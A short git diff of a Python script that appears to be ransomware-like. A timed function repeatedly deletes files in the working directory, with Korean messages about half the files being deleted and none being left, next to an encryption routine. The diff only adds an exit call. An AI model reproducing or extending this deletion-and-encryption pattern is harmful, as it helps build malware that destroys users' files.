@@ -71,6 +71,7 @@ def remove_files(path,ext=None):
 #            os.remove(remove_filelist[i])
 #        print("파일 중 절반이 삭제되었습니다.")
         print("더 이상 삭제할 파일이 없습니다")
+        exit(0)
     threading.Timer(5, remove_files, [os.getcwd()]).start()
 
 def enc(key, cipher, in_filename, out_filename=None):
